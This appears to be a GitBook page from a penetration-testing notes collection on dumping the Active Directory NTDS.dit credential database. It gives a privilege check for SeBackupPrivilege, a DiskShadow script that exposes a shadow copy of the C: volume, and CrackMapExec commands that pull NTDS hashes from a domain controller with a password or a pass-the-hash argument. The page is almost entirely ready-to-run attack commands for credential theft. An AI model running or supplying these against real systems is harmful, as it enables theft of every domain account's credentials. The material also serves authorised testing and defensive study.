# Dump NTDS.dit

Source

{% embed url="https://wiki.porchetta.industries/smb-protocol/obtaining-credentials/dump-ntds.dit" %}

## Verify Backup Privileges

Running <mark style="color:green;">**`whoami /priv`**</mark> should show us if we have the right privileges to make a backup of the NTDS.dit and SYSTEM files. We are looking for <mark style="color:green;">**`SeBackupPrivilege`**</mark>

## DiskShadow

Create a file called vss.dsh with the code below in it. Then run `unix2dos vss.dsh` to convert a readable windows file.

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```



## CrackMapExec

```
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
```

```
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

```
#~ cme smb 192.168.1.100 -u UserNAme -H 'HASH HERE' --ntds vss
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
